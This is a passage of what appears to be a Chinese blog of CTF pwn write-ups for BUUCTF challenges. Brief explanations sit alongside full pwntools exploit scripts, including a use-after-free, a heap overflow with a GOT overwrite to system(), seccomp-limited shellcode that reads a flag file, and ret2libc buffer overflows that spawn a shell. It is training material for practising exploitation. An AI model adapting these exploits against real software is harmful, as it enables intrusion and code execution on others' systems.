class="hljs-number">2</span>+p64(<span class="hljs-number">0x71</span>)+p64(magic-<span class="hljs-number">0x13</span>))<br>create(<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;bbbb&#x27;</span>)<br>create(<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;bbbb&#x27;</span>)     <span class="hljs-comment">#index3</span><br>edit(<span class="hljs-number">3</span>,p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+p64(elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]))<br>edit(<span class="hljs-number">0</span>,p64(elf.sym[<span class="hljs-string">&#x27;system&#x27;</span>]))<br>delete(<span class="hljs-number">1</span>)<br><span class="hljs-comment">#gdb.attach(r)</span><br>r.interactive()<br></code></pre></td></tr></table></figure><p><strong>在heaparray里填free_got和chunk0中填system_plt怎么联系起来的，如何劫持got的：</strong></p><p>​                填入free_got这一步的时候，覆盖了chunk0的地址，chunk0的地址那里写入了free_got的地址</p><p>然后再去edit chunk0，就等于edit free_got，然后改成system</p><h3 id="hitcontraining-uaf">hitcontraining_uaf</h3><p>这题堆释放后指针并未清空，再次申请原本print_note_content的变成了shell函数，主要这题print函数还用调用自身来put。</p><p>后面申请8个字节，是把note0的fd改写成了magic函数地址，应为note1的bk指向note0的fd</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import * </span><br>local_file  = <span class="hljs-string">&#x27;./hacknote&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">28547</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br><br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#-------------------------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">content_size,content</span>):<br>        sla(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>        sla(<span class="hljs-string">&#x27;Note size :&#x27;</span>,<span class="hljs-built_in">str</span>(content_size))<br>        sla(<span class="hljs-string">&#x27;Content :&#x27;</span>,<span class="hljs-built_in">str</span>(content))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>        sla(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>        sla(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">printf</span>(<span class="hljs-params">index</span>):<br>        sla(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>        sla(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-comment">#------------------------------------------------</span><br>magic=<span class="hljs-number">0x8048945</span><br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">8</span>,p32(magic))<br>printf(<span class="hljs-number">0</span>)<br><span class="hljs-comment">#gdb.attach(r)</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="babyfengshui-33c3-2016：">babyfengshui_33c3_2016：</h3><p>利用题目中的结构，绕过长度检测机制，堆溢出使中间一个堆的prevsize填上free的got表地址，利用show函数泄露free实际地址，可得知libc基址，system。利用机制绕过长度检测，可用update函数，把freegot表地址改写成system，最后再free有binsh的那个块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import * </span><br><br>local_file  = <span class="hljs-string">&#x27;./babyfengshui_33c3_2016&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br><br>select = <span class="hljs-number">1</span><br><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">29328</span> )<br>    libc = ELF(remote_libc)<br><br>elf = ELF(local_file)<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br><br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#----------------------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,length,text</span>):<br> sla(<span class="hljs-string">&#x27;Action: &#x27;</span>,<span class="hljs-string">&#x27;0&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;size of description: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br> sla(<span class="hljs-string">&#x27;name: &#x27;</span>,<span class="hljs-string">&#x27;qyq&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;text length: &#x27;</span>,<span class="hljs-built_in">str</span>(length))<br> sla(<span class="hljs-string">&#x27;text: &#x27;</span>,text)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br> sla(<span class="hljs-string">&#x27;Action: &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;index: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br> sla(<span class="hljs-string">&#x27;Action: &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;index: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">update</span>(<span class="hljs-params">index,text</span>):<br> sla(<span class="hljs-string">&#x27;Action: &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;index: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br> sla(<span class="hljs-string">&#x27;text length: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(text)))<br> sla(<span class="hljs-string">&#x27;text: &#x27;</span>,text)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exit</span>():<br> sla(<span class="hljs-string">&#x27;text: &#x27;</span>,<span class="hljs-number">4</span>)<br><span class="hljs-comment">#----------------------------------------------</span><br>add(<span class="hljs-number">0x80</span>,<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;aaa&#x27;</span>)<br>add(<span class="hljs-number">0x80</span>,<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;aaa&#x27;</span>)<br>add(<span class="hljs-number">0x8</span>,<span class="hljs-number">0x8</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>delete(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x100</span>,<span class="hljs-number">0x19c</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x198</span>+p32(elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]))<br>show(<span class="hljs-number">1</span>)<br>ru(<span class="hljs-string">&#x27;description: &#x27;</span>)<br>free_addr=(u32(rc(<span class="hljs-number">4</span>)))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(free_addr)<br>base=free_addr-libc.sym[<span class="hljs-string">&#x27;free&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(base)<br>sys=base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>update(<span class="hljs-number">1</span>,p32(sys))<br>delete(<span class="hljs-number">2</span>)<br><span class="hljs-comment">#gdb.attach(r)</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="pwnable-orw">pwnable_orw</h3><p>这题有orw_seccomp()限制，但没开NX，而且题目直接给好格式，自己写个shell汇编。</p><p>下面估计可以直接抄。</p><p>思路：</p><ul><li>打开flag文件，<code>sys_open(file,0,0)</code>；系统调用号为5</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs 汇编">push 0x0  #字符串结尾<br>push 0x67616c66#&#x27;flags&#x27;<br>mov ebx,esp<br>xor ecx,ecx#0<br>xor edx,edx#0<br>mov eax,0x5#调用号<br>int 0x80#sys_open(flags,0,0)<br></code></pre></td></tr></table></figure><ul><li>读flag文件，<code>sys_read(3,file,0x100)</code>；系统调用号为3</li></ul><p><code>mov eax,0x3;</code><br><code>mov ecx,ebx;# ecx = char __user *buf 缓冲区，读出的数据--&gt;也就是读“flag”</code><br><code>mov ebx,0x3;# 文件描述符 fd:是文件描述符 0 1 2 3 代表标准的输出输入和出错,其他打开的文件</code><br><code>mov edx,0x100;#对应字节数</code><br><code>int 0x80;</code></p><ul><li>输出flag文件内容，<code>sys_write(1,file,0x30)</code>；系统调用号为4</li></ul><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">mov</span> eax,0x4;<span class="hljs-comment"># eax = sys_write</span><br><span class="hljs-attribute">mov</span> ebx,0x1;<span class="hljs-comment"># ebx = unsigned int fd = 1</span><br><span class="hljs-attribute">int</span> 0x80;<br></code></pre></td></tr></table></figure><p>搞得很麻烦，有更简洁的，exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">25103</span>)<br>shell = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">push 0x0</span><br><span class="hljs-string">push 0x67616c66</span><br><span class="hljs-string">mov ebx,esp</span><br><span class="hljs-string">xor ecx,ecx</span><br><span class="hljs-string">xor edx,edx</span><br><span class="hljs-string">mov eax,0x5</span><br><span class="hljs-string">int 0x80</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br>shell+=asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov eax,0x3</span><br><span class="hljs-string">mov ecx,ebx</span><br><span class="hljs-string">mov ebx,0x3</span><br><span class="hljs-string">mov edx,0x100</span><br><span class="hljs-string">int 0x80</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br>shell+=asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov eax,0x4</span><br><span class="hljs-string">mov ebx,0x1</span><br><span class="hljs-string">int 0x80</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><br><span class="hljs-comment">#context.binary=&#x27;orw&#x27;</span><br><span class="hljs-comment">#elf=ELF(&#x27;orw&#x27;)</span><br><span class="hljs-comment">#shell=shellcraft.open(&#x27;./flag&#x27;)</span><br><span class="hljs-comment">#shell+=shellcraft.read(&#x27;eax&#x27;,&#x27;esp&#x27;,100)</span><br><span class="hljs-comment">#shell+=shellcraft.write(1,&#x27;esp&#x27;,100)</span><br><span class="hljs-comment">#shell=asm(shell)</span><br>r.sendlineafter(<span class="hljs-string">&quot;Give my your shellcode:&quot;</span>,shell)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="picoctf-2018-buffer-overflow-2">picoctf_2018_buffer overflow 2</h3><p>忘光了，记一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">28901</span>)<br>win=<span class="hljs-number">0x80485cb</span><br>a1=<span class="hljs-number">0xDEADBEEF</span><br>a2=<span class="hljs-number">0xDEADC0DE</span><br>r.sendline(<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x6c</span>+<span class="hljs-string">&#x27;bbbb&#x27;</span>+p32(win)+p32(<span class="hljs-number">0</span>)+p32(a1)+p32(a2))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="xdctf2015-pwn200">xdctf2015_pwn200</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">27228</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./bof&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br>r.recvline()<br>r.sendline(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x6c</span>+<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">4</span>+p32(elf.sym[<span class="hljs-string">&#x27;write&#x27;</span>])+p32(<span class="hljs-number">0x80484d6</span>)+p32(<span class="hljs-number">1</span>)+p32(elf.got[<span class="hljs-string">&#x27;write&#x27;</span>])+p32(<span class="hljs-number">8</span>))<br>true=u32(r.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(true)<br>base=true-libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(base)<br>system=base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh=base+<span class="hljs-number">0x15902b</span><br>r.sendline(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x6c</span>+<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">4</span>+p32(system)+p32(<span class="hljs-number">0</span>)+p32(binsh))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="jarvisoj-level1">jarvisoj_level1</h3><p>忘了nx的做法，不过既然保护什么都没开，直接ret2libc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">25716</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./level1&#x27;</span>)<br>context.arch=<span class="hljs-string">&#x27;i386&#x27;</span><br>sc=asm(shellcraft.sh())<br>r.sendline(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span>+<span class="hljs-string">&#x27;bbbb&#x27;</span>+p32(elf.sym[<span class="hljs-string">&#x27;write&#x27;</span>])+p32(elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>])+p32(<span class="hljs-number">1</span>)+p32(elf.got[<span class="hljs-string">&#x27;write&#x27;</span>])+p32(<span class="hljs-number">4</span>))<br>true=u32(r.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(true)<br>base=true-libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>system=base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh=base+<span class="hljs-number">0x15902b</span><br>r.sendline(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span>+<span class="hljs-string">&#x27;bbbb&#x27;</span>+p32(system)+p32(<span class="hljs-number">0</span>)+p32(binsh))<br>r.interactive()<br><br><br></code></pre></td></tr></table></figure><h3 id="ciscn-2019-n-3">ciscn_2019_n_3</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import * </span><br>local_file  = <span class="hljs-string">&#x27;./ciscn_2019_n_3&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">28934</span>)<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span 